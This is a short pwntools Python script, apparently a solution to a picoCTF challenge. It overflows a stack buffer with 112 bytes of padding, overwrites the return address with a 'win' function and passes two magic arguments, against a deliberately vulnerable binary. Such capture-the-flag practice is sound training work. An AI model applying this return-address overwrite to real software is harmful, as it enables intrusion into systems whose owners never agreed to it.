#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 54076)

    return r


def main():
    r = conn()
    offset = 112
    arg1 = 0xCAFEF00D
    arg2 = 0xF00DF00D

    payload = b'A' * offset # JUNK
    payload += p32(exe.symbols['win'])
    payload += b'JUNK' # Return Address
    payload += p32(arg1)
    payload += p32(arg2)
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()

